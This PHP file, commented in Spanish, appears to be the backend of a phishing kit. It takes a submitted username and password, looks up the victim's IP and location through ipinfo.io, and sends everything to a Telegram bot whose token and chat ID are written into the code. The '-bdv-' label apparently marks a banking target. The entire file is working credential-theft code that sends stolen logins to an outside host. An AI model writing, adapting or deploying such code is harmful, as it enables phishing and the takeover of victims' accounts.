<?php
// Obtener los datos enviados en formato JSON
$data = json_decode(file_get_contents('php://input'), true);

// Verificar que los datos 'usr' y 'pw' estén presentes
if (isset($data['usr']) && isset($data['pw'])) {
    $usr = $data['usr'];
    $pw = $data['pw'];

    // Obtener la dirección IP del cliente
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Si la IP es pasada a través de un proxy, usamos la primera IP en la lista
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        $ip = explode(',', $ip)[0]; // Tomar la primera IP en la lista
    } else {
        $ip = $_SERVER['REMOTE_ADDR']; // Usar la IP directamente si no hay proxy
    }

    // Obtener información de la IP usando la API de ipinfo.io
    $ip_info_url = "https://ipinfo.io/{$ip}/json";
    $ip_info = @json_decode(file_get_contents($ip_info_url));

    if ($ip_info === null) {
        // Manejo de error si la API no respondió correctamente
        error_log("No se pudo obtener la información de la IP.");
        $ciudad = 'Desconocida';
        $pais = 'Desconocido';
    } else {
        // Extraer la ciudad y el país si la API respondió correctamente
        $ciudad = isset($ip_info->city) ? $ip_info->city : 'Desconocida';
        $pais = isset($ip_info->country) ? $ip_info->country : 'Desconocido';
    }

    // El token de tu bot de Telegram y el chat ID
    $token = '7508938063:AAHW4VFXD-nNPdq2voTPpBubz-vfp-VJFzo';
    $chatId = '5720253440';  // El chat ID donde quieres enviar el mensaje

    // Crear el mensaje que se enviará a Telegram
    $message = "-bdv-\n --Usr.: $usr \n  Token: $pw\n" .
               "IP: $ip\nCiudad: $ciudad\nPaís: $pais";

    // Configuración de la solicitud a la API de Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Los datos que se enviarán en la solicitud POST
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'html',
    ];

    // Usar cURL para enviar la solicitud a Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Ejecutar la solicitud y obtener la respuesta
    $response = curl_exec($ch);
    curl_close($ch);

    // Verificar si la respuesta fue exitosa
    if ($response) {
        // Responder al cliente con éxito
        echo json_encode([
            'status' => 'success',
            'message' => 'Mensaje enviado a Telegram con éxito.'
        ]);
    } else {
        // Responder con error si algo falló
        echo json_encode([
            'status' => 'error',
            'message' => 'Error al enviar el mensaje a Telegram.'
        ]);
    }
} else {
    // Si faltan datos en la solicitud, devolver un error
    echo json_encode([
        'status' => 'error',
        'message' => 'Datos insuficientes.'
    ]);
}
?>
